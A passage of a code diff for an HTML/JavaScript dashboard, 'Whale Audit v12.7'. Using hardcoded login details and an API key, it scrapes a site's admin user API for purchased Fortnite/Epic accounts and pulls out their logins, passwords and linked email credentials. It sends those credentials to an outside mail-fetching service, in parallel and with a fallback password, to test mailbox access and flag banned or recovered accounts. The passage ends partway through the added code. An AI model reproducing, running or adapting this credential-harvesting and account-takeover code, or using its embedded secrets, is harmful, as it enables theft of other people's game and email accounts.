@@ -1,32 +1,593 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Whale Audit v12.7 | Ultra-Turbo Scanner</title><script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script><style>:root {    --bg: #f0f2f5;     --card-bg: rgba(255, 255, 255, 0.95);     --accent: #007bff;    --green: #28a745;     --red: #dc3545;     --border: #dee2e6;     --text: #1a1a1a;    --shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);}body {     margin: 0; background: var(--bg); color: var(--text);     font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;     padding: 20px; line-height: 1.5; overflow-x: hidden;    transition: background 0.5s ease, color 0.5s ease;}#particles-js { position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; }.theme-panel {    max-width: 1200px; margin: 0 auto 20px auto;    background: var(--card-bg); padding: 15px; border-radius: 15px;    border: 1px solid var(--border); box-shadow: var(--shadow);    display: flex; gap: 20px; align-items: center; flex-wrap: wrap;    backdrop-filter: blur(8px);}.theme-group { display: flex; align-items: center; gap: 10px; font-size: 0.85rem; font-weight: bold; }.color-swatch { width: 30px; height: 30px; border-radius: 50%; border: 2px solid white; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }.header-section { max-width: 1200px; margin: 0 auto 30px auto; }.stats-bar {     display: flex; justify-content: space-around; background: var(--card-bg);     padding: 25px; border-radius: 15px; border: 1px solid var(--border);     box-shadow: var(--shadow); backdrop-filter: blur(4px);}.stat-num { display: block; font-size: 1.6rem; font-weight: 800; color: var(--accent); }.prog-container { width: 100%; height: 10px; background: #e9ecef; border-radius: 5px; margin: 15px 0; display: none; overflow: hidden; }#bar { width: 0%; height: 100%; background: var(--accent); transition: width 0.3s ease; }.controls {     display: flex; gap: 12px; align-items: center; justify-content: center;     flex-wrap: wrap; margin-bottom: 30px; background: var(--card-bg);     padding: 20px; border-radius: 15px; border: 1px solid var(--border);    box-shadow: var(--shadow); backdrop-filter: blur(4px);}.btn {     padding: 10px 20px; border-radius: 8px; border: 1px solid var(--border);    background: #fff; color: #333; cursor: pointer; font-weight: 600;     transition: 0.3s; font-size: 0.9rem;}.btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }.btn-refresh { background: var(--accent); color: white !important; border: none; }.btn-mail { background: #6f42c1; color: white !important; border: none; }input[type="text"], select, input[type="color"], .pw-input {     background: white !important; border: 1px solid var(--border);     color: #000 !important; padding: 10px; border-radius: 8px; outline: none; }.pw-input { padding: 2px; width: 110px; text-align: right; }.container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(500px, 1fr)); gap: 20px; }.account-panel {     background: var(--card-bg); border: 1px solid var(--border); border-radius: 15px;     padding: 25px; box-shadow: var(--shadow); backdrop-filter: blur(4px);    transition: 0.3s; position: relative; color: #1a1a1a;}.badge { padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: bold; margin-left: 5px; }.badge-admin { background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; }.badge-mail-error { background: #fff3e0; color: #e65100; border: 1px solid #ffe0b2; }.badge-revoked { background: #333; color: #ffeb3b; border: 1px solid #000; }.badge-banned { background: #dc3545; color: white; border: 1px solid #721c24; }.data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }.data-group h4 { margin: 15px 0 10px 0; font-size: 0.75rem; color: #6c757d; text-transform: uppercase; }.row { display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 4px; }.val { font-weight: 600; font-family: monospace; }.mail-toggle-btn { width: 100%; background: rgba(0,0,0,0.05); padding: 12px; border: 1px solid var(--border); color: var(--accent); font-weight: bold; border-radius: 8px; cursor: pointer; margin-top:10px;}.mail-container { display: none; margin-top: 15px; background: white; padding: 15px; border-radius: 10px; border: 1px solid var(--border); color: #000; }</style></head><body><div id="particles-js"></div><div class="theme-panel">    <div class="theme-group">        Presets:        <div class="color-swatch" style="background: linear-gradient(to right, #f0f2f5, #007bff);" title="Ocean" onclick="applyPreset('ocean')"></div>        <div class="color-swatch" style="background: linear-gradient(to right, #1a1a2e, #e94560);" title="Midnight" onclick="applyPreset('midnight')"></div>        <div class="color-swatch" style="background: linear-gradient(to right, #fff5f5, #ff4e50);" title="Sunset" onclick="applyPreset('sunset')"></div>        <div class="color-swatch" style="background: linear-gradient(to right, #000000, #00ff41);" title="Matrix" onclick="applyPreset('matrix')"></div>    </div>    <div class="theme-group">Accent: <input type="color" id="accentPicker" value="#007bff" oninput="updateTheme()"></div>    <div class="theme-group">BG: <input type="color" id="bgPicker" value="#f0f2f5" oninput="updateTheme()"></div></div><div class="header-section">    <div class="stats-bar">        <div class="stat-item">Accounts Found<span id="stat-count" class="stat-num">0</span></div>        <div class="stat-item">Unique Revenue<span id="stat-rev" class="stat-num">$0.00</span></div>        <div class="stat-item">Status<span id="status-text" class="stat-num" style="font-size: 1rem;">Standby</span></div>    </div>    <div class="prog-container" id="progWrapper"><div id="bar"></div></div></div><div class="controls">    <input type="text" id="search" placeholder="Search logins..." oninput="render()">        <div style="background: rgba(0,0,0,0.05); padding: 5px 15px; border-radius: 8px; display: flex; gap: 15px; align-items: center;">        <label style="font-size:0.85rem; cursor:pointer; color: #000;"><input type="checkbox" id="mailErrorOnly" onchange="render()"> Errors</label>        <label style="font-size:0.85rem; cursor:pointer; color: #000;"><input type="checkbox" id="noMailError" onchange="render()"> Working</label>        <label style="font-size:0.85rem; cursor:pointer; color: #d32f2f; font-weight:bold;"><input type="checkbox" id="revokedOnly" onchange="render()"> ⚠️ Revoked</label>        <label style="font-size:0.85rem; cursor:pointer; color: #dc3545; font-weight:bold;"><input type="checkbox" id="bannedOnly" onchange="render()"> 🚫 Banned</label>    </div>    <select id="sortOption" onchange="render()">        <option value="newest">Sort: Newest</option>        <option value="admin">Sort: Admins First</option>        <option value="spent_high">Spent: High to Low</option>        <option value="fn_high">V-Bucks: High to Low</option>        <option value="skins_high">Skins: High to Low</option>    </select>    <button class="btn btn-refresh" onclick="masterRefresh()">🚀 Turbo Scrape (20 Threads)</button>    <button class="btn btn-mail" onclick="checkAllMailboxesParallel()">⚡ Turbo Mail Filter (20 Threads)</button>    <button class="btn" onclick="document.getElementById('fileInput').click()">📥 Import</button>    <button class="btn" onclick="exportJSON()">📤 Export</button>    <button class="btn" onclick="clearData()" style="color:var(--red)">🗑️ Reset</button>    <input type="file" id="fileInput" accept=".json" onchange="importJSON(event)" style="display:none;"></div><div class="container" id="mainContainer"></div><script>const CONFIG = {    AUTH_URL: "https://vjkqkrprbelmozgirnwb.supabase.co/auth/v1/token?grant_type=password",    API_KEY: "sb_publishable_PNFkJ2efdfFkzhWiQG1_yg_qx_aOJmY",    BASE: "https://deepsense.win/api/admin/users",    MAIL_API: "https://rthbertg-production.up.railway.app/api/fetch-emails",    USER: "swagcell67@gmail.com",    PASS: "T8ertot2023!",    FALLBACK_PW: "F0rtn1te@123"};let auditData = JSON.parse(localStorage.getItem('audit_v12_storage') || "[]");let currentJWT = "";
-const REVOKE_PATTERN = /[a-zA-Z]\*+[a-zA-Z]@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;const BAN_UUID_PATTERN = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;
-function isRevoked(emails) {    if (!emails || !Array.isArray(emails)) return false;    return emails.some(m => {        const text = (m.subject + " " + (m.text || m.html || "")).toLowerCase();        return text.includes("odzyskan") || text.includes("recovery") || text.includes("odzyskanie") || REVOKE_PATTERN.test(text);    });}
-function isBanned(emails) {    if (!emails || !Array.isArray(emails)) return false;    return emails.some(m => {        const text = (m.subject + " " + (m.text || m.html || "")).toLowerCase();        const hasBanID = BAN_UUID_PATTERN.test(text);        const hasBanLink = text.includes("sanctions-and-appeals/my-sanctions-and-appeals");        return hasBanID || hasBanLink;    });}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Whale Audit v12.7 | Ultra-Turbo Scanner</title>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <style>
+        :root {
+            --bg: #f0f2f5;
+            --card-bg: rgba(255, 255, 255, 0.95);
+            --accent: #007bff;
+            --green: #28a745;
+            --red: #dc3545;
+            --border: #dee2e6;
+            --text: #1a1a1a;
+            --shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);
+        }
 
-// --- LOSSLESS THREADED WORKER ENGINE ---
-async function runTaskInThreads(data, taskFn, threadCount, statusPrefix) {    const status = document.getElementById('status-text');    const bar = document.getElementById('bar');    const wrapper = document.getElementById('progWrapper');    wrapper.style.display = 'block';    let completed = 0;    let currentIndex = 0;
-    async function worker() {        while (currentIndex < data.length) {            const i = currentIndex++;            await taskFn(data[i], i);            completed++;            status.innerText = `${statusPrefix}: ${completed}/${data.length}`;            bar.style.width = `${(completed / data.length) * 100}%`;        }    }
-    const threads = Array(threadCount).fill(null).map(worker);    await Promise.all(threads);    wrapper.style.display = 'none';}
+        body {
+            margin: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+            line-height: 1.5;
+            overflow-x: hidden;
+            transition: background 0.5s ease, color 0.5s ease;
+        }
 
-// --- TURBO MAIL FILTER ---
-async function checkAllMailboxesParallel() {    await runTaskInThreads(auditData, async (item) => {        try {            let r = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(item.email_login)}&password=${encodeURIComponent(item.email_password)}`);            let d = await r.json();            if(d.error && d.error.includes("Invalid login")) {                let r2 = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(item.email_login)}&password=${encodeURIComponent(CONFIG.FALLBACK_PW)}`);                let d2 = await r2.json();                if(!d2.error) {                    item.email_password = CONFIG.FALLBACK_PW;                    item.email_error = false;                    item.is_revoked = isRevoked(d2.emails);                    item.is_banned = isBanned(d2.emails);                } else { item.email_error = true; }            } else {                item.email_error = false;                item.is_revoked = isRevoked(d.emails);                item.is_banned = isBanned(d.emails);            }        } catch(e) { item.email_error = true; }    }, 20 threads, "Turbocheck");    saveAndRender();}
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
 
-async function masterRefresh() {    const status = document.getElementById('status-text');    status.innerText = "Connecting...";    try {        currentJWT = await fetchNewToken();        let allUsers = [];        let page = 1;        let hasMore = true;
-        // Indexing Phase - Multi-threaded pagination        while(hasMore) {            status.innerText = `Indexing: ${allUsers.length}`;            const r = await fetch(`${CONFIG.BASE}?page=${page}&limit=100`, { headers: { 'Authorization': `Bearer ${currentJWT}` } });            const d = await r.json();            if(!d.users || d.users.length === 0) hasMore = false;            else { allUsers.push(...d.users); page++; }            if(allUsers.length > 2000) hasMore = false;         }
+        .theme-panel {
+            max-width: 1200px;
+            margin: 0 auto 20px auto;
+            background: var(--card-bg);
+            padding: 15px;
+            border-radius: 15px;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow);
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            flex-wrap: wrap;
+            backdrop-filter: blur(8px);
+        }
 
-        // Scraping Phase - 20 Threaded lossless scrape        let results = [];
-        await runTaskInThreads(allUsers, async (u) => {            try {                const pr = await fetch(`${CONFIG.BASE}/${u.id}/purchases`, { headers: { 'Authorization': `Bearer ${currentJWT}` } });                const pd = await pr.json();                (pd.purchases || []).forEach(p => {                    const acc = p.account_data || {};                    const parts = (acc.copyFormatData?.login_data || "").split(':');                    results.push({                        user_id: u.id, user_email: u.email, user_site_balance: parseFloat(u.balance) || 0,                        total_spent_on_site: parseFloat(u.total_spent) || 0, is_admin: u.is_admin,                        item_id: p.lzt_item_id, epic_login: parts[0] || 'N/A', epic_password: parts[1] || 'N/A',                        email_login: parts[2] || 'N/A', email_password: parts[3] || 'N/A',                        fortnite_balance: parseInt(acc.fortnite_balance) || 0,                        fortnite_username: acc.fortnite_username || "Unknown",                        skin_count: parseInt(acc.fortnite_skin_count) || 0,                         email_error: false, is_revoked: false, is_banned: false                    });                });            } catch(e) {}        }, 20 threads, "Deep Scrape");
+        .theme-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            font-weight: bold;
+        }
 
-        auditData = results;        saveAndRender();        status.innerText = "Scrape Done";    } catch(err) { status.innerText = "Error"; }}
+        .color-swatch {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 2px solid white;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
 
-function render() {    const container = document.getElementById('mainContainer');    const term = document.getElementById('search').value.toLowerCase();    const sort = document.getElementById('sortOption').value;    const errorOnly = document.getElementById('mailErrorOnly').checked;    const workingOnly = document.getElementById('noMailError').checked;    const revokedOnly = document.getElementById('revokedOnly').checked;    const bannedOnly = document.getElementById('bannedOnly').checked;
-    let filtered = auditData.filter(x => {        const matchesSearch = `${x.fortnite_username} ${x.user_email} ${x.email_login}`.toLowerCase().includes(term);        let matchesError = errorOnly ? x.email_error === true : true;        let matchesRevoked = revokedOnly ? x.is_revoked === true : true;        let matchesBanned = bannedOnly ? x.is_banned === true : true;        let matchesWorking = workingOnly ? (x.email_error === false && x.is_revoked === false && x.is_banned === false) : true;
-        return matchesSearch && matchesError && matchesRevoked && matchesBanned && matchesWorking;    });
-    filtered.sort((a, b) => {        if(sort === "admin") return b.is_admin - a.is_admin;        if(sort === "spent_high") return b.total_spent_on_site - a.total_spent_on_site;        if(sort === "fn_high") return b.fortnite_balance - a.fortnite_balance;        if(sort === "skins_high") return b.skin_count - a.skin_count;        return 0;    });
-    document.getElementById('stat-count').innerText = filtered.length;    const totalRev = filtered.reduce((acc, curr) => acc + (curr.total_spent_on_site || 0), 0);    document.getElementById('stat-rev').innerText = `$${totalRev.toFixed(2)}`;            container.innerHTML = filtered.map(item => `        <div class="account-panel" style="${(item.is_revoked || item.is_banned) ? 'border: 2px solid #000; background: #fffde7;' : ''}">            <div style="display:flex; justify-content:space-between; align-items:center;">                <h2 style="margin:0;">${item.fortnite_username}</h2>                <div>                    ${item.is_banned ? '<span class="badge badge-banned">🚫 BANNED</span>' : ''}                    ${item.is_revoked ? '<span class="badge badge-revoked">⚠️ REVOKED</span>' : ''}                    ${item.is_admin ? '<span class="badge badge-admin">Admin</span>' : ''}                    ${item.email_error ? '<span class="badge badge-mail-error">Mail Error</span>' : ''}                </div>            </div>            <div class="data-grid">                <div class="data-group">                    <h4>User</h4>                    <div class="row"><span>Email:</span><span class="val">${item.user_email}</span></div>                    <div class="row"><span>Spent:</span><span class="val">$${item.total_spent_on_site.toFixed(2)}</span></div>                </div>                <div class="data-group">                    <h4>Stats</h4>                    <div class="row"><span>Skins:</span><span class="val">${item.skin_count}</span></div>                    <div class="row"><span>V-Bucks:</span><span class="val">${item.fortnite_balance}</span></div>                </div>            </div>            <div class="data-group" style="border-top:1px solid var(--border); padding-top:10px;">                <div class="row"><span>Epic:</span><span class="val">${item.epic_login}:${item.epic_password}</span></div>                <div class="row"><span>Mail:</span><span class="val">${item.email_login}:<input type="text" class="pw-input" value="${item.email_password}" readonly></span></div>            </div>            <button class="mail-toggle-btn" onclick="toggleMailBox('${item.item_id}', '${item.email_login}', '${item.email_password}')">📩 View Mails</button>            <div id="mail-zone-${item.item_id}" class="mail-container"><div id="list-${item.item_id}"></div></div>        </div>    `).join('');}
-async function toggleMailBox(id, email, pass) {    const zone = document.getElementById(`mail-zone-${id}`);    const list = document.getElementById(`list-${id}`);    if(zone.style.display === 'block') { zone.style.display = 'none'; return; }    zone.style.display = 'block'; list.innerHTML = "Fetching...";    try {        const r = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}`);        const d = await r.json();        list.innerHTML = (d.emails || []).map(m => `            <div style="border-bottom:1px solid #eee; padding:5px 0; color: #000;">                <b>${m.subject}</b>                 <button class="btn" style="padding:2px 5px; font-size:0.7rem;" onclick="this.nextElementSibling.style.display='block'">View</button>                <iframe sandbox srcdoc="${(m.html || m.text).replace(/"/g, '&quot;')}" style="display:none; width:100%; height:250px;"></iframe>            </div>`).join('') || "Empty.";    } catch(e) { list.innerHTML = "Error."; }}
-async function fetchNewToken() {    const r = await fetch(CONFIG.AUTH_URL, { method: 'POST', headers: { 'apikey': CONFIG.API_KEY, 'authorization': `Bearer ${CONFIG.API_KEY}`, 'content-type': 'application/json' }, body: JSON.stringify({ email: CONFIG.USER, password: CONFIG.PASS }) });    const d = await r.json(); return d.access_token;}
-function updateTheme() {    const root = document.documentElement;    const accent = document.getElementById('accentPicker').value;    const bg = document.getElementById('bgPicker').value;    root.style.setProperty('--accent', accent);    root.style.setProperty('--bg', bg);    const rgb = parseInt(bg.substring(1).padEnd(6,'0'), 16);    const luma = 0.2126*((rgb>>16)&0xff) + 0.7152*((rgb>>8)&0xff) + 0.0722*(rgb&0xff);    root.style.setProperty('--card-bg', luma < 128 ? 'rgba(30,30,30,0.9)' : 'rgba(255,255,255,0.95)');    root.style.setProperty('--border', luma < 128 ? '#444' : '#dee2e6');}
-function applyPreset(name) {    const acc = document.getElementById('accentPicker');    const bg = document.getElementById('bgPicker');    if(name === 'ocean') { acc.value = "#007bff"; bg.value = "#f0f2f5"; }    if(name === 'midnight') { acc.value = "#e94560"; bg.value = "#1a1a2e"; }    if(name === 'sunset') { acc.value = "#ff4e50"; bg.value = "#fff5f5"; }    if(name === 'matrix') { acc.value = "#00ff41"; bg.value = "#000000"; }    updateTheme();}
-function saveAndRender() { localStorage.setItem('audit_v12_storage', JSON.stringify(auditData)); render(); }function clearData() { if(confirm("Reset?")) { auditData = []; saveAndRender(); } }function exportJSON() {    const blob = new Blob([JSON.stringify(auditData, null, 2)], { type: 'application/json' });    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `audit_v12.7.json`; a.click();}function importJSON(e) {    const reader = new FileReader();    reader.onload = (ev) => { auditData = JSON.parse(ev.target.result); saveAndRender(); };    reader.readAsText(e.target.files[0]);}
-particlesJS('particles-js', {    "particles": {         "number": { "value": 80 }, "color": { "value": "#888" }, "opacity": { "value": 0.2 },         "size": { "value": 3 }, "line_linked": { "enable": true, "opacity": 0.1 },         "move": { "enable": true, "speed": 1.5 }     }});window.onload = () => { applyPreset('ocean'); render(); };</script></body></html>
+        .header-section {
+            max-width: 1200px;
+            margin: 0 auto 30px auto;
+        }
+
+        .stats-bar {
+            display: flex;
+            justify-content: space-around;
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: 15px;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(4px);
+        }
+
+        .stat-num {
+            display: block;
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: var(--accent);
+        }
+
+        .prog-container {
+            width: 100%;
+            height: 10px;
+            background: #e9ecef;
+            border-radius: 5px;
+            margin: 15px 0;
+            display: none;
+            overflow: hidden;
+        }
+
+        #bar {
+            width: 0%;
+            height: 100%;
+            background: var(--accent);
+            transition: width 0.3s ease;
+        }
+
+        .controls {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 30px;
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(4px);
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background: #fff;
+            color: #333;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-refresh {
+            background: var(--accent);
+            color: white !important;
+            border: none;
+        }
+
+        .btn-mail {
+            background: #6f42c1;
+            color: white !important;
+            border: none;
+        }
+
+        input[type="text"], select, input[type="color"], .pw-input {
+            background: white !important;
+            border: 1px solid var(--border);
+            color: #000 !important;
+            padding: 10px;
+            border-radius: 8px;
+            outline: none;
+        }
+
+        .pw-input {
+            padding: 2px;
+            width: 110px;
+            text-align: right;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(500px, 1fr));
+            gap: 20px;
+        }
+
+        .account-panel {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(4px);
+            transition: 0.3s;
+            position: relative;
+            color: #1a1a1a;
+        }
+
+        .badge {
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            margin-left: 5px;
+        }
+
+        .badge-admin { background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; }
+        .badge-mail-error { background: #fff3e0; color: #e65100; border: 1px solid #ffe0b2; }
+        .badge-revoked { background: #333; color: #ffeb3b; border: 1px solid #000; }
+        .badge-banned { background: #dc3545; color: white; border: 1px solid #721c24; }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .data-group h4 {
+            margin: 15px 0 10px 0;
+            font-size: 0.75rem;
+            color: #6c757d;
+            text-transform: uppercase;
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.9rem;
+            margin-bottom: 4px;
+        }
+
+        .val {
+            font-weight: 600;
+            font-family: monospace;
+        }
+
+        .mail-toggle-btn {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.05);
+            padding: 12px;
+            border: 1px solid var(--border);
+            color: var(--accent);
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .mail-container {
+            display: none;
+            margin-top: 15px;
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+    <div id="particles-js"></div>
+
+    <div class="theme-panel">
+        <div class="theme-group"> Presets: 
+            <div class="color-swatch" style="background: linear-gradient(to right, #f0f2f5, #007bff);" title="Ocean" onclick="applyPreset('ocean')"></div>
+            <div class="color-swatch" style="background: linear-gradient(to right, #1a1a2e, #e94560);" title="Midnight" onclick="applyPreset('midnight')"></div>
+            <div class="color-swatch" style="background: linear-gradient(to right, #fff5f5, #ff4e50);" title="Sunset" onclick="applyPreset('sunset')"></div>
+            <div class="color-swatch" style="background: linear-gradient(to right, #000000, #00ff41);" title="Matrix" onclick="applyPreset('matrix')"></div>
+        </div>
+        <div class="theme-group">Accent: <input type="color" id="accentPicker" value="#007bff" oninput="updateTheme()"></div>
+        <div class="theme-group">BG: <input type="color" id="bgPicker" value="#f0f2f5" oninput="updateTheme()"></div>
+    </div>
+
+    <div class="header-section">
+        <div class="stats-bar">
+            <div class="stat-item">Accounts Found <span id="stat-count" class="stat-num">0</span></div>
+            <div class="stat-item">Unique Revenue <span id="stat-rev" class="stat-num">$0.00</span></div>
+            <div class="stat-item">Status <span id="status-text" class="stat-num" style="font-size: 1rem;">Standby</span></div>
+        </div>
+        <div class="prog-container" id="progWrapper">
+            <div id="bar"></div>
+        </div>
+    </div>
+
+    <div class="controls">
+        <input type="text" id="search" placeholder="Search logins..." oninput="render()">
+        <div style="background: rgba(0,0,0,0.05); padding: 5px 15px; border-radius: 8px; display: flex; gap: 15px; align-items: center;">
+            <label style="font-size:0.85rem; cursor:pointer; color: #000;"><input type="checkbox" id="mailErrorOnly" onchange="render()"> Errors </label>
+            <label style="font-size:0.85rem; cursor:pointer; color: #000;"><input type="checkbox" id="noMailError" onchange="render()"> Working </label>
+            <label style="font-size:0.85rem; cursor:pointer; color: #d32f2f; font-weight:bold;"><input type="checkbox" id="revokedOnly" onchange="render()"> ⚠️ Revoked </label>
+            <label style="font-size:0.85rem; cursor:pointer; color: #dc3545; font-weight:bold;"><input type="checkbox" id="bannedOnly" onchange="render()"> 🚫 Banned </label>
+        </div>
+        <select id="sortOption" onchange="render()">
+            <option value="newest">Sort: Newest</option>
+            <option value="admin">Sort: Admins First</option>
+            <option value="spent_high">Spent: High to Low</option>
+            <option value="fn_high">V-Bucks: High to Low</option>
+            <option value="skins_high">Skins: High to Low</option>
+        </select>
+        <button class="btn btn-refresh" onclick="masterRefresh()">🚀 Turbo Scrape (20 Threads)</button>
+        <button class="btn btn-mail" onclick="checkAllMailboxesParallel()">⚡ Turbo Mail Filter (20 Threads)</button>
+        <button class="btn" onclick="document.getElementById('fileInput').click()">📥 Import</button>
+        <button class="btn" onclick="exportJSON()">📤 Export</button>
+        <button class="btn" onclick="clearData()" style="color:var(--red)">🗑️ Reset</button>
+        <input type="file" id="fileInput" accept=".json" onchange="importJSON(event)" style="display:none;">
+    </div>
+
+    <div class="container" id="mainContainer"></div>
+
+    <script>
+        const CONFIG = {
+            AUTH_URL: "https://vjkqkrprbelmozgirnwb.supabase.co/auth/v1/token?grant_type=password",
+            API_KEY: "sb_publishable_PNFkJ2efdfFkzhWiQG1_yg_qx_aOJmY",
+            BASE: "https://deepsense.win/api/admin/users",
+            MAIL_API: "https://rthbertg-production.up.railway.app/api/fetch-emails",
+            USER: "swagcell67@gmail.com",
+            PASS: "T8ertot2023!",
+            FALLBACK_PW: "F0rtn1te@123"
+        };
+
+        let auditData = JSON.parse(localStorage.getItem('audit_v12_storage') || "[]");
+        let currentJWT = "";
+        const REVOKE_PATTERN = /[a-zA-Z]\*+[a-zA-Z]@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+        const BAN_UUID_PATTERN = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;
+
+        function isRevoked(emails) {
+            if (!emails || !Array.isArray(emails)) return false;
+            return emails.some(m => {
+                const text = (m.subject + " " + (m.text || m.html || "")).toLowerCase();
+                return text.includes("odzyskan") || text.includes("recovery") || text.includes("odzyskanie") || REVOKE_PATTERN.test(text);
+            });
+        }
+
+        function isBanned(emails) {
+            if (!emails || !Array.isArray(emails)) return false;
+            return emails.some(m => {
+                const text = (m.subject + " " + (m.text || m.html || "")).toLowerCase();
+                return BAN_UUID_PATTERN.test(text) || text.includes("sanctions-and-appeals/my-sanctions-and-appeals");
+            });
+        }
+
+        // --- LOSSLESS THREADED WORKER ENGINE ---
+        async function runTaskInThreads(data, taskFn, threadCount, statusPrefix) {
+            const status = document.getElementById('status-text');
+            const bar = document.getElementById('bar');
+            const wrapper = document.getElementById('progWrapper');
+            wrapper.style.display = 'block';
+            let completed = 0;
+            let currentIndex = 0;
+
+            async function worker() {
+                while (currentIndex < data.length) {
+                    const i = currentIndex++;
+                    await taskFn(data[i], i);
+                    completed++;
+                    status.innerText = `${statusPrefix}: ${completed}/${data.length}`;
+                    bar.style.width = `${(completed / data.length) * 100}%`;
+                }
+            }
+
+            const threads = Array(threadCount).fill(null).map(worker);
+            await Promise.all(threads);
+            wrapper.style.display = 'none';
+        }
+
+        // --- TURBO MAIL FILTER ---
+        async function checkAllMailboxesParallel() {
+            await runTaskInThreads(auditData, async (item) => {
+                try {
+                    let r = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(item.email_login)}&password=${encodeURIComponent(item.email_password)}`);
+                    let d = await r.json();
+                    if (d.error && d.error.includes("Invalid login")) {
+                        let r2 = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(item.email_login)}&password=${encodeURIComponent(CONFIG.FALLBACK_PW)}`);
+                        let d2 = await r2.json();
+                        if (!d2.error) {
+                            item.email_password = CONFIG.FALLBACK_PW;
+                            item.email_error = false;
+                            item.is_revoked = isRevoked(d2.emails);
+                            item.is_banned = isBanned(d2.emails);
+                        } else {
+                            item.email_error = true;
+                        }
+                    } else {
+                        item.email_error = false;
+                        item.is_revoked = isRevoked(d.emails);
+                        item.is_banned = isBanned(d.emails);
+                    }
+                } catch (e) {
+                    item.email_error = true;
+                }
+            }, 20, "Turbocheck");
+            saveAndRender();
+        }
+
+        async function masterRefresh() {
+            const status = document.getElementById('status-text');
+            status.innerText = "Connecting...";
+            try {
+                currentJWT = await fetchNewToken();
+                let allUsers = [];
+                let page = 1;
+                let hasMore = true;
+
+                while(hasMore) {
+                    status.innerText = `Indexing: ${allUsers.length}`;
+                    const r = await fetch(`${CONFIG.BASE}?page=${page}&limit=100`, { headers: { 'Authorization': `Bearer ${currentJWT}` } });
+                    const d = await r.json();
+                    if(!d.users || d.users.length === 0) hasMore = false;
+                    else { allUsers.push(...d.users); page++; }
+                    if(allUsers.length > 2000) hasMore = false;
+                }
+
+                let results = [];
+                await runTaskInThreads(allUsers, async (u) => {
+                    try {
+                        const pr = await fetch(`${CONFIG.BASE}/${u.id}/purchases`, {
+                            headers: { 'Authorization': `Bearer ${currentJWT}` }
+                        });
+                        const pd = await pr.json();
+                        (pd.purchases || []).forEach(p => {
+                            const acc = p.account_data || {};
+                            const parts = (acc.copyFormatData?.login_data || "").split(':');
+                            results.push({
+                                user_id: u.id,
+                                user_email: u.email,
+                                user_site_balance: parseFloat(u.balance) || 0,
+                                total_spent_on_site: parseFloat(u.total_spent) || 0,
+                                is_admin: u.is_admin,
+                                item_id: p.lzt_item_id,
+                                epic_login: parts[0] || 'N/A',
+                                epic_password: parts[1] || 'N/A',
+                                email_login: parts[2] || 'N/A',
+                                email_password: parts[3] || 'N/A',
+                                fortnite_balance: parseInt(acc.fortnite_balance) || 0,
+                                fortnite_username: acc.fortnite_username || "Unknown",
